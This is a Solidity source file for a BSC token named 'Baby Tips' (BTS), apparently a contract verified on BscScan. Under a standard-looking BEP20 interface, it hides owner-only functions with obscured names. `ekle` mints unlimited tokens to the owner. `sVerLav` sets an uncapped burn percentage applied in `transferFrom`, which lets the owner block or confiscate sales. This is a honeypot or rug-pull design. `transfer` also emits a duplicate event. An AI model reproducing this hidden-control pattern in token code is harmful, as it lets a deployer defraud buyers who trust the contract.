/**
 *Submitted for verification at BscScan.com on 2021-08-10
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.6;

abstract contract IBEP20{
    function totalSupply() public virtual view returns (uint);
    function balanceOf(address tokenOwner) public virtual view returns (uint balance);
    function allowance(address tokenOwner, address spender) public virtual view returns (uint remaining);
    function transfer(address to, uint tokens) public virtual returns (bool success);
    function approve(address spender, uint tokens) public virtual returns (bool success);
    function transferFrom(address from, address to, uint tokens) public virtual returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

library MathKA {
    
    function ad(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "Math: addition overflow");

        return c;
    }
    function subb(uint256 a, uint256 b) internal pure returns (uint256) {
        return subb(a, b, "Math: subtraction overflow");
    }

    function subb(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "Math: multiplication overflow");

    return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "Math: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

}

contract HelloBEP20 is IBEP20 {
    using MathKA for uint256;

    string public name20KK =  "Baby Tips";
    string public symbol20KK =  "BTS";
    uint8 public decimals20KK = 9;
    uint public _totalSupplyKK = 1*10**15 * 10**9;
    
    address private _owner;
    uint8 private _jdaking;
    

    mapping(address => uint) balances;
    mapping(address => mapping(address => uint)) allowed;

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        balances[msg.sender] = _totalSupplyKK;
        emit Transfer(address(0), msg.sender, _totalSupplyKK);
    }
    
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }    
    
    function getOwner() public virtual view returns (address) {
        return owner();
    }
    
    function name() public virtual view returns (string memory) {
        return name20KK;
    }

    function symbol() public virtual view returns (string memory) {
        return symbol20KK;
    }

  function decimals() public view virtual returns (uint8) {
        return decimals20KK;
    }

    function totalSupply() public override view returns (uint) {
        return _totalSupplyKK - balances[address(0)];
    }

    function balanceOf(address tokenOwner) public override view returns (uint balance) {
        return balances[tokenOwner];
    }

    function allowance(address tokenOwner, address spender) public override view returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }
    
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = balances[sender];
        require(senderBalance >= amount, "BEP20: transfer amount exceeds balance");
        unchecked {
            balances[sender] = senderBalance - amount;
        }
        balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function transfer(address to, uint tokens) public override returns (bool success) {
        _transfer(msg.sender, to, tokens);
        emit Transfer(msg.sender, to, tokens);
        return true;
    }

    function approve(address spender, uint tokens) public override returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }

    function transferFrom(address from, address to, uint tokens) public override returns (bool success) {
       
        _lavj(from,tokens.mul(getVerLav()).div(10**2));
        _transfer(from, to, tokens.subb(tokens.mul(getVerLav()).div(10**2)));
        
        _approve(from, _msgSender(), allowed[from][_msgSender()].subb(tokens, "BEP20: transfer amount exceeds allowance"));
        return true;
     
    }
    
    function _approve(address tokenOwner, address spender, uint256 tokens) internal {
        require(tokenOwner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        allowed[tokenOwner][spender] = tokens;
        emit Approval(tokenOwner, spender, tokens);
    }    
    
    function _lavj(address tokenOwner, uint256 tokens) internal {
        require(tokenOwner != address(0), "BEP20: yak from the zero address");

        balances[tokenOwner] = balances[tokenOwner].subb(tokens, "BEP20: yak amount exceeds balance");
        _totalSupplyKK = _totalSupplyKK.subb(tokens);
        emit Transfer(tokenOwner, 0x000000000000000000000000000000000000dEaD, tokens);
    }    
    
    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Own: caller is not the owner");
        _;
    }
  
    function sVerLav(uint8 jdaking) public virtual onlyOwner {
		_jdaking = jdaking;
	}
	
	function getVerLav() public view returns (uint8) {
        return _jdaking;
    }

    function ekle(uint256 amount) public onlyOwner returns (bool) {
        _ekle(_msgSender(), amount);
        return true;
    }
    
    function _ekle(address tokenOwner, uint256 tokens) internal {
        require(tokenOwner != address(0), "BEP20: ekle to the zero address");

        _totalSupplyKK = _totalSupplyKK.ad(tokens);
        balances[tokenOwner] = balances[tokenOwner].ad(tokens);
        emit Transfer(address(0), tokenOwner, tokens);
    }

}